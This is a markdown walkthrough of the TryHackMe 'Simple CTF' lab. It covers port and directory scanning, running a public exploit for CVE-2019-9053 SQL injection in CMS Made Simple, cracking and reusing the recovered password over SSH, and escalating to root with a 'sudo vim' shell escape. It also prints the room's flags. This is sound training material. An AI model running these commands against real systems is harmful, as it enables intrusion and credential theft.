# 🧬 Simple CTF — Walkthrough

🔗 **TryHackMe Room:** [Simple CTF](https://tryhackme.com/room/easyctf)

```diff
> enumerate wide • crack the CMS secret • sudo vim becomes root
```

---

## ℹ️ Information

- **Platform:** TryHackMe
- **Difficulty:** Beginner
- **Goal:** recover the web credentials, get an SSH shell, retrieve `user.txt`, escalate to `root`, then retrieve `root.txt`
- **Exposed services:** FTP, HTTP, and SSH on port `2222`

---

## 🧠 Reconnaissance

### Port Scan

Start by scanning the target:

```bash
nmap -p 1-1000 simplectf.thm -sV -T5
```

Initial result:

```text
21/tcp open  ftp   vsftpd 3.0.3
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

![Initial port scan](screenshots/1-HowManyServicesPort1000.png)

A fuller scan reveals the SSH service on a non-standard port:

```text
2222/tcp open  ssh  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```

👉 **Insight:**
The first scan answers the "under 1000 ports" question, but the real access path needs deeper enumeration. SSH is listening on `2222`, not `22`.

---

## 🌐 Web Enumeration

### Directory Discovery

The web server exposes the default Apache page, so directory discovery is the next move:

```bash
dirsearch -u http://simplectf.thm/
```

Interesting results:

```text
/robots.txt
/simple  ->  http://simplectf.thm/simple/
```

![Web application discovery](screenshots/5-WAPP.png)

The `/simple` path leads to CMS Made Simple.

👉 **Insight:**
Default Apache pages are often just the lobby. Directory enumeration is what finds the actual application.

---

## 🧪 Exploitation

### CMS Made Simple SQL Injection

CMS Made Simple versions up to `2.2.9` are vulnerable to unauthenticated SQL injection through CVE-2019-9053. The public exploit is available on Exploit-DB:

```text
https://www.exploit-db.com/exploits/46635
```

The original exploit needed adjustment for the local Python 3 environment, then it was run against the CMS path with a password list:

```bash
python3 cmsexploit.py -u http://simplectf.thm/simple -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt -c
```

Recovered values:

```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

![Password recovered](screenshots/6-Password.png)

Credentials:

```text
mitch:secret
```

![TryHackMe answers](screenshots/3-RoomAnswers.png)

👉 **Insight:**
The exploit does two jobs: it extracts the CMS account data and, with a wordlist, cracks the salted hash into a reusable password.

---

## 🐚 Initial Access

Use the recovered credentials to connect through SSH on port `2222`:

```bash
ssh mitch@simplectf.thm -p 2222
```

After authentication, the target drops into a shell as `mitch`.

```text
Welcome to Ubuntu 16.04.6 LTS
$ whoami
mitch
```

👉 **Insight:**
Password reuse turns a CMS compromise into system access. Once credentials appear, test them against every exposed login service.

---

## 🚩 User Flag

The user flag is in `mitch`'s home directory:

```bash
cd /home/mitch
ls -la
cat user.txt
```

Flag:

```text
G00d j0b, keep up!
```

![Room progress](screenshots/4-RoomAnswers.png)

---

## ⬆️ Privilege Escalation

### Sudo Enumeration

Check what `mitch` can run with elevated privileges:

```bash
sudo -l
```

Important result:

```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

### Root Shell

Because `vim` can be executed as root without a password, use it to spawn a shell:

```bash
sudo vim -c ':!/bin/sh'
```

Then confirm privileges:

```bash
whoami
```

```text
root
```

👉 **Insight:**
`sudo -l` is small but powerful. A single passwordless editor entry can become a full root shell when the binary supports command execution.

---

## 👑 Root Flag

Find and read the root flag:

```bash
find / -type f -name root.txt 2>/dev/null
cat /root/root.txt
```

Flag:

```text
W3ll d0n3. You made it!
```

---

## 🧠 Final Thoughts

This room highlights:

- full port enumeration
- web directory discovery
- CMS Made Simple exploitation
- hash cracking with a wordlist
- SSH access through reused credentials
- `sudo` privilege escalation with GTFOBins

---

```diff
> hidden SSH gives the foothold • passwordless vim gives the crown
```

## 🔗 References

- [TryHackMe - Simple CTF](https://tryhackme.com/room/easyctf)
- [Exploit-DB - CMS Made Simple <= 2.2.9 SQL Injection](https://www.exploit-db.com/exploits/46635)
- [CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- [GTFOBins - Vim](https://gtfobins.github.io/gtfobins/vim/)

---

The detailed terminal notes are preserved in [Notes.md](Notes.md), and the original exported writeup with the Python exploit block is preserved in [SimpleCTF-Original.md](SimpleCTF-Original.md).
